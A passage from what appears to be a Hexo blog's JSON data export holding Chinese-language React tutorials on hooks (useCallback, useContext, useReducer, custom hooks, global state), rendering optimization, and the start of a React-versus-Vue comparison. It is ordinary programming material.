useState(<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> callback = useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> count;</span><br><span class=\"line\">\t&#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (</span><br><span class=\"line\">\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t&lt;h4&gt;&#123;count&#125;&lt;/h4&gt;</span><br><span class=\"line\">\t\t\t&lt;Child callback=&#123;callback&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;div&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> setCount(count + <span class=\"number\">1</span>)&#125;&gt;+&lt;/button&gt;</span><br><span class=\"line\">\t\t\t\t&lt;input value=&#123;val&#125; onChange=&#123;<span class=\"function\"><span class=\"params\">event</span> =&gt;</span> setVal(event.target.value)&#125; /&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 子组件</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Child = <span class=\"function\">(<span class=\"params\">&#123; callback &#125;</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"function\">() =&gt;</span> callback());</span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\tsetCount(callback());</span><br><span class=\"line\">\t&#125;, [callback]);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> React.memo(Child)</span><br><span class=\"line\">\t<span class=\"comment\">// 用React.memo包裹</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"6-useContext\"><a href=\"#6-useContext\" class=\"headerlink\" title=\"6. useContext\"></a>6. useContext</h2><p>接收一个 <code>context</code> 对象（React.createContext 的返回值）并返回该 context 的当前值。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// initContext 可以为基础数据类型、对象或者函数</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> context = React.useContext(React.createContext(initContext))</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>当前的 context 值由上层组件中距离当前组件最近的 <code>&lt;MyContext.Provider&gt;</code> 的 <code>value</code> <strong>prop</strong> 决定，如果 <code>&lt;MyContext.Provider&gt;</code> 没有提供 <code>value</code> <strong>prop</strong>，则 <code>context</code> 中获取到的值为 <code>React.createContext(initContext)</code> 中的 <code>initContext</code> 值</p>\n</blockquote>\n<blockquote>\n<p>当 <code>&lt;MyContext.Provider&gt;</code> 更新时，该 Hook 会触发重渲染，并使用最新传递给 <code>MyContext provider</code> 的 <code>context</code> <strong>value</strong> 值</p>\n</blockquote>\n<h2 id=\"7-useReducer\"><a href=\"#7-useReducer\" class=\"headerlink\" title=\"7. useReducer\"></a>7. useReducer</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> [state, dispatch] = useReducer(reducer, initialArg, init);</span><br></pre></td></tr></table></figure>\n\n<p>在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为你可以向子组件传递 dispatch 而不是回调函数 </p>\n<blockquote>\n<p>React 会确保 dispatch 函数的标识是稳定的，并且不会在组件重新渲染时改变。这就是为什么可以安全地从 useEffect 或 useCallback 的依赖列表中省略 dispatch</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> reducer =<span class=\"function\">(<span class=\"params\">state = <span class=\"number\">0</span>, &#123;type&#125;</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;add&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state+<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&#x27;delete&#x27;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state-<span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> Hook =<span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count, dispatch] = useReducer(reducer, <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(</span><br><span class=\"line\">        &lt;div&gt;</span><br><span class=\"line\">           count:&#123;count&#125;</span><br><span class=\"line\">           &lt;button onClick=&#123;<span class=\"function\">()=&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>:<span class=\"string\">&#x27;add&#x27;</span>&#125;)&#125;&gt;add&lt;/button&gt;</span><br><span class=\"line\">            &lt;button onClick=&#123;<span class=\"function\">()=&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>:<span class=\"string\">&#x27;delete&#x27;</span>&#125;)&#125;&gt;<span class=\"keyword\">delete</span>&lt;/button&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> Hook</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"8-自定义-hooks\"><a href=\"#8-自定义-hooks\" class=\"headerlink\" title=\"8. 自定义 hooks\"></a>8. 自定义 hooks</h2><p><strong>当触发 resize 事件时，自动更新 width、height</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; useEffect, useState &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> useWindowSize = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [width, setWidth] = useState()</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> [height, setHeight] = useState()</span><br><span class=\"line\"></span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">const</span> &#123; clientWidth, clientHeight &#125; = <span class=\"built_in\">document</span>.documentElement</span><br><span class=\"line\">\t\tsetWidth(clientWidth)</span><br><span class=\"line\">\t\tsetHeight(clientHeight)</span><br><span class=\"line\">\t&#125;, [])</span><br><span class=\"line\"></span><br><span class=\"line\">\tuseEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">const</span> handleWindowSize = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">const</span> &#123; clientWidth, clientHeight &#125; = <span class=\"built_in\">document</span>.documentElement</span><br><span class=\"line\">\t\t\tsetWidth(clientWidth)</span><br><span class=\"line\">\t\t\tsetHeight(clientHeight)</span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">&#x27;resize&#x27;</span>, handleWindowSize, <span class=\"literal\">false</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">window</span>.removeEventListener(<span class=\"string\">&#x27;resize&#x27;</span>, handleWindowSize, <span class=\"literal\">false</span>)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &#123; width, height &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"9-全局状态管理（useContext-useReducer）\"><a href=\"#9-全局状态管理（useContext-useReducer）\" class=\"headerlink\" title=\"9. 全局状态管理（useContext + useReducer）\"></a>9. 全局状态管理（useContext + useReducer）</h2><ol>\n<li>定义 <code>reducer</code> 函数、初始 <code>state</code> 值，通过 <code>useReducer(reducer, state)</code> 生成 <code>state</code> 和 <code>dispatch</code></li>\n<li>父组件通过 <code>&lt;Context.Provider&gt;</code> 将 <code>state</code> 数据、<code>dispatch</code> 函数提供给 context</li>\n<li>子孙组件通过 <code>useContext()</code> 获取到 <code>state</code>、<code>dispatch</code></li>\n<li>子孙组件通过 <code>state</code> 数据绑定到 VNode、触发事件时调用 <code>dispatch</code> 函数</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// store.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; createContext, useContext, useReducer &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> StoreContext = createContext();</span><br><span class=\"line\"><span class=\"keyword\">const</span> initialState = &#123;<span class=\"attr\">count</span>: <span class=\"number\">0</span>, <span class=\"attr\">message</span>: <span class=\"string\">&#x27;&#125;;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">const reducer = (state, action) =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"string\">  switch(action.type) &#123;</span></span><br><span class=\"line\"><span class=\"string\">    case &#x27;</span>increment<span class=\"string\">&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">      return &#123;</span></span><br><span class=\"line\"><span class=\"string\">        count: state.count + 1,</span></span><br><span class=\"line\"><span class=\"string\">        message: action.message</span></span><br><span class=\"line\"><span class=\"string\">      &#125;</span></span><br><span class=\"line\"><span class=\"string\">    case &#x27;</span>decrement<span class=\"string\">&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">      return &#123;</span></span><br><span class=\"line\"><span class=\"string\">        count: state.count - 1,</span></span><br><span class=\"line\"><span class=\"string\">        message: action.message</span></span><br><span class=\"line\"><span class=\"string\">      &#125;</span></span><br><span class=\"line\"><span class=\"string\">      case &#x27;</span>reset<span class=\"string\">&#x27;:</span></span><br><span class=\"line\"><span class=\"string\">        return &#123;</span></span><br><span class=\"line\"><span class=\"string\">          count: 0,</span></span><br><span class=\"line\"><span class=\"string\">          message: action.message</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    default:</span></span><br><span class=\"line\"><span class=\"string\">      throw new Error(`Unhandled action type: $&#123;action.type&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">  &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">export const StoreProvider = (&#123; children &#125;) =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"string\">  const [state, dispatch] = useReducer(reducer, initialState);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  return (</span></span><br><span class=\"line\"><span class=\"string\">    &lt;StoreContext.Provider value=&#123;&#123;state, dispatch&#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &#123;children&#125;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/StoreContext.Provider&gt;</span></span><br><span class=\"line\"><span class=\"string\">  )</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">export const useStore = () =&gt; useContext(StoreContext);</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// index.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react-dom&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; StoreProvider &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./store&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; ChildComponent &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./childComponent&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">App</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;StoreProvider&gt;</span><br><span class=\"line\">      &lt;ChildComponent/&gt;</span><br><span class=\"line\">    &lt;/StoreProvider&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&#x27;root&#x27;</span>);</span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span> /&gt;</span></span>, rootElement);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// childComponent.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; useStore &#125; <span class=\"keyword\">from</span> <span class=\"string\">&#x27;./store&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> ChildComponent = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> &#123;state, dispatch&#125; = useStore();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">      &#123;state.count&#125;</span><br><span class=\"line\">      &lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>: <span class=\"string\">&#x27;increment&#x27;</span>, <span class=\"attr\">message</span>:<span class=\"string\">&#x27;Incremented&#x27;</span>&#125;)&#125;&gt;+&lt;/button&gt;</span><br><span class=\"line\">      &lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>: <span class=\"string\">&#x27;decrement&#x27;</span>, <span class=\"attr\">message</span>: <span class=\"string\">&#x27;Decremented&#x27;</span>&#125;)&#125;&gt;-&lt;/button&gt;</span><br><span class=\"line\">      &lt;button onClick=&#123;<span class=\"function\">() =&gt;</span> dispatch(&#123;<span class=\"attr\">type</span>: <span class=\"string\">&#x27;reset&#x27;</span>, <span class=\"attr\">message</span>: <span class=\"string\">&#x27;Reset&#x27;</span>&#125;)&#125;&gt;Reset&lt;/button&gt;</span><br><span class=\"line\">      &#123;state.message&#125;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n"},{"title":"React 优化","date":"2021-05-26T08:32:38.000Z","_content":"\n# React 优化\n\n#### 使用 PureComponent、React.memo 进行浅比较\n\n在 React 工作流中，如果只有父组件发生状态更新，即使父组件传给子组件的所有 Props 都没有修改，也会引起子组件的 Render 过程。\n\n如果子组件的 Props 和 State 都没有改变，那么其生成的 DOM 结构和副作用也不应该发生改变。当子组件符合声明式设计理念时，就可以忽略子组件本次的 Render 过程，PureComponent 是对类组件的 Props 和 State 进行浅比较，React.memo 是对函数组件的 Props 进行浅比较。\n\n#### 使用 useMemo、useCallback 实现稳定的 Props 值\n\n如果传给子组件的派生状态或函数，每次都是新的引用，那么 PureComponent 和 React.memo 优化就会失效。所以需要使用 useMemo 和 useCallback 来生成稳定值，并结合 PureComponent 或 React.memo 避免子组件重新 Render\n\n> useCallback、useMemo 应配合 React.memo 使用\n\n#### 使用 useMemo 减少组件 Render 过程耗时\n\nuseMemo 是一种缓存机制提速，当它的依赖未发生改变时，就不会触发重新计算，用于派生属性，类似于 Vue 的 computed 属性。\n\n#### 避免使用内联对象或内联函数\n\n函数式组件在每次 render 时都会重新的定义一个新的对象，对于 prop 的浅层比较始终返回false，导致组件一直重新渲染，包括内联样式的引用。可在组件外部定义一个对象，将该对象传递给子组件即可。\n内联函数也有同样的问题，每次 render 都是不一样的\n\n#### 列表项使用 key 属性\n#### 组件合理的拆分与解耦\n#### 按优先级更新，及时响应用户\n#### debounce、throttle 优化频繁触发的回调\n#### 延迟加载组件\n\n\n","source":"_posts/React/React 优化.md","raw":"---\ntitle: React 优化\ncategories: React\ntags: [React]\ndate: 2021-05-26 16:32:38\n---\n\n# React 优化\n\n#### 使用 PureComponent、React.memo 进行浅比较\n\n在 React 工作流中，如果只有父组件发生状态更新，即使父组件传给子组件的所有 Props 都没有修改，也会引起子组件的 Render 过程。\n\n如果子组件的 Props 和 State 都没有改变，那么其生成的 DOM 结构和副作用也不应该发生改变。当子组件符合声明式设计理念时，就可以忽略子组件本次的 Render 过程，PureComponent 是对类组件的 Props 和 State 进行浅比较，React.memo 是对函数组件的 Props 进行浅比较。\n\n#### 使用 useMemo、useCallback 实现稳定的 Props 值\n\n如果传给子组件的派生状态或函数，每次都是新的引用，那么 PureComponent 和 React.memo 优化就会失效。所以需要使用 useMemo 和 useCallback 来生成稳定值，并结合 PureComponent 或 React.memo 避免子组件重新 Render\n\n> useCallback、useMemo 应配合 React.memo 使用\n\n#### 使用 useMemo 减少组件 Render 过程耗时\n\nuseMemo 是一种缓存机制提速，当它的依赖未发生改变时，就不会触发重新计算，用于派生属性，类似于 Vue 的 computed 属性。\n\n#### 避免使用内联对象或内联函数\n\n函数式组件在每次 render 时都会重新的定义一个新的对象，对于 prop 的浅层比较始终返回false，导致组件一直重新渲染，包括内联样式的引用。可在组件外部定义一个对象，将该对象传递给子组件即可。\n内联函数也有同样的问题，每次 render 都是不一样的\n\n#### 列表项使用 key 属性\n#### 组件合理的拆分与解耦\n#### 按优先级更新，及时响应用户\n#### debounce、throttle 优化频繁触发的回调\n#### 延迟加载组件\n\n\n","slug":"React/React 优化","published":1,"updated":"2021-06-07T11:46:32.131Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjxu260001df6rfc457mt8","content":"<h1 id=\"React-优化\"><a href=\"#React-优化\" class=\"headerlink\" title=\"React 优化\"></a>React 优化</h1><h4 id=\"使用-PureComponent、React-memo-进行浅比较\"><a href=\"#使用-PureComponent、React-memo-进行浅比较\" class=\"headerlink\" title=\"使用 PureComponent、React.memo 进行浅比较\"></a>使用 PureComponent、React.memo 进行浅比较</h4><p>在 React 工作流中，如果只有父组件发生状态更新，即使父组件传给子组件的所有 Props 都没有修改，也会引起子组件的 Render 过程。</p>\n<p>如果子组件的 Props 和 State 都没有改变，那么其生成的 DOM 结构和副作用也不应该发生改变。当子组件符合声明式设计理念时，就可以忽略子组件本次的 Render 过程，PureComponent 是对类组件的 Props 和 State 进行浅比较，React.memo 是对函数组件的 Props 进行浅比较。</p>\n<h4 id=\"使用-useMemo、useCallback-实现稳定的-Props-值\"><a href=\"#使用-useMemo、useCallback-实现稳定的-Props-值\" class=\"headerlink\" title=\"使用 useMemo、useCallback 实现稳定的 Props 值\"></a>使用 useMemo、useCallback 实现稳定的 Props 值</h4><p>如果传给子组件的派生状态或函数，每次都是新的引用，那么 PureComponent 和 React.memo 优化就会失效。所以需要使用 useMemo 和 useCallback 来生成稳定值，并结合 PureComponent 或 React.memo 避免子组件重新 Render</p>\n<blockquote>\n<p>useCallback、useMemo 应配合 React.memo 使用</p>\n</blockquote>\n<h4 id=\"使用-useMemo-减少组件-Render-过程耗时\"><a href=\"#使用-useMemo-减少组件-Render-过程耗时\" class=\"headerlink\" title=\"使用 useMemo 减少组件 Render 过程耗时\"></a>使用 useMemo 减少组件 Render 过程耗时</h4><p>useMemo 是一种缓存机制提速，当它的依赖未发生改变时，就不会触发重新计算，用于派生属性，类似于 Vue 的 computed 属性。</p>\n<h4 id=\"避免使用内联对象或内联函数\"><a href=\"#避免使用内联对象或内联函数\" class=\"headerlink\" title=\"避免使用内联对象或内联函数\"></a>避免使用内联对象或内联函数</h4><p>函数式组件在每次 render 时都会重新的定义一个新的对象，对于 prop 的浅层比较始终返回false，导致组件一直重新渲染，包括内联样式的引用。可在组件外部定义一个对象，将该对象传递给子组件即可。<br>内联函数也有同样的问题，每次 render 都是不一样的</p>\n<h4 id=\"列表项使用-key-属性\"><a href=\"#列表项使用-key-属性\" class=\"headerlink\" title=\"列表项使用 key 属性\"></a>列表项使用 key 属性</h4><h4 id=\"组件合理的拆分与解耦\"><a href=\"#组件合理的拆分与解耦\" class=\"headerlink\" title=\"组件合理的拆分与解耦\"></a>组件合理的拆分与解耦</h4><h4 id=\"按优先级更新，及时响应用户\"><a href=\"#按优先级更新，及时响应用户\" class=\"headerlink\" title=\"按优先级更新，及时响应用户\"></a>按优先级更新，及时响应用户</h4><h4 id=\"debounce、throttle-优化频繁触发的回调\"><a href=\"#debounce、throttle-优化频繁触发的回调\" class=\"headerlink\" title=\"debounce、throttle 优化频繁触发的回调\"></a>debounce、throttle 优化频繁触发的回调</h4><h4 id=\"延迟加载组件\"><a href=\"#延迟加载组件\" class=\"headerlink\" title=\"延迟加载组件\"></a>延迟加载组件</h4>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React-优化\"><a href=\"#React-优化\" class=\"headerlink\" title=\"React 优化\"></a>React 优化</h1><h4 id=\"使用-PureComponent、React-memo-进行浅比较\"><a href=\"#使用-PureComponent、React-memo-进行浅比较\" class=\"headerlink\" title=\"使用 PureComponent、React.memo 进行浅比较\"></a>使用 PureComponent、React.memo 进行浅比较</h4><p>在 React 工作流中，如果只有父组件发生状态更新，即使父组件传给子组件的所有 Props 都没有修改，也会引起子组件的 Render 过程。</p>\n<p>如果子组件的 Props 和 State 都没有改变，那么其生成的 DOM 结构和副作用也不应该发生改变。当子组件符合声明式设计理念时，就可以忽略子组件本次的 Render 过程，PureComponent 是对类组件的 Props 和 State 进行浅比较，React.memo 是对函数组件的 Props 进行浅比较。</p>\n<h4 id=\"使用-useMemo、useCallback-实现稳定的-Props-值\"><a href=\"#使用-useMemo、useCallback-实现稳定的-Props-值\" class=\"headerlink\" title=\"使用 useMemo、useCallback 实现稳定的 Props 值\"></a>使用 useMemo、useCallback 实现稳定的 Props 值</h4><p>如果传给子组件的派生状态或函数，每次都是新的引用，那么 PureComponent 和 React.memo 优化就会失效。所以需要使用 useMemo 和 useCallback 来生成稳定值，并结合 PureComponent 或 React.memo 避免子组件重新 Render</p>\n<blockquote>\n<p>useCallback、useMemo 应配合 React.memo 使用</p>\n</blockquote>\n<h4 id=\"使用-useMemo-减少组件-Render-过程耗时\"><a href=\"#使用-useMemo-减少组件-Render-过程耗时\" class=\"headerlink\" title=\"使用 useMemo 减少组件 Render 过程耗时\"></a>使用 useMemo 减少组件 Render 过程耗时</h4><p>useMemo 是一种缓存机制提速，当它的依赖未发生改变时，就不会触发重新计算，用于派生属性，类似于 Vue 的 computed 属性。</p>\n<h4 id=\"避免使用内联对象或内联函数\"><a href=\"#避免使用内联对象或内联函数\" class=\"headerlink\" title=\"避免使用内联对象或内联函数\"></a>避免使用内联对象或内联函数</h4><p>函数式组件在每次 render 时都会重新的定义一个新的对象，对于 prop 的浅层比较始终返回false，导致组件一直重新渲染，包括内联样式的引用。可在组件外部定义一个对象，将该对象传递给子组件即可。<br>内联函数也有同样的问题，每次 render 都是不一样的</p>\n<h4 id=\"列表项使用-key-属性\"><a href=\"#列表项使用-key-属性\" class=\"headerlink\" title=\"列表项使用 key 属性\"></a>列表项使用 key 属性</h4><h4 id=\"组件合理的拆分与解耦\"><a href=\"#组件合理的拆分与解耦\" class=\"headerlink\" title=\"组件合理的拆分与解耦\"></a>组件合理的拆分与解耦</h4><h4 id=\"按优先级更新，及时响应用户\"><a href=\"#按优先级更新，及时响应用户\" class=\"headerlink\" title=\"按优先级更新，及时响应用户\"></a>按优先级更新，及时响应用户</h4><h4 id=\"debounce、throttle-优化频繁触发的回调\"><a href=\"#debounce、throttle-优化频繁触发的回调\" class=\"headerlink\" title=\"debounce、throttle 优化频繁触发的回调\"></a>debounce、throttle 优化频繁触发的回调</h4><h4 id=\"延迟加载组件\"><a href=\"#延迟加载组件\" class=\"headerlink\" title=\"延迟加载组件\"></a>延迟加载组件</h4>"},{"title":"React 和 Vue 的区别","date":"2021-05-26T08:32:38.000Z","_content":"\n# React 和 Vue 的区别\n\n* 数据是否可变\n  * React 整体是函数式的思想，把组件设计成纯组件，状态和逻辑通过参数传入，所以在 React中，是单向数据流，推崇结合 immutable 来实现数据不可变\n  * Vue 的思想是响应式的，也就是基于是数据可变的，通过对每一个属性建立 Watcher 来监听，当属性变化的时候，响应式的更新对应的虚拟dom。\n  * 总之，React 的性能优化需要手动去做，而 Vue 的性能优化是自动的，但是Vue的响应式机制也有问题，就是当 state 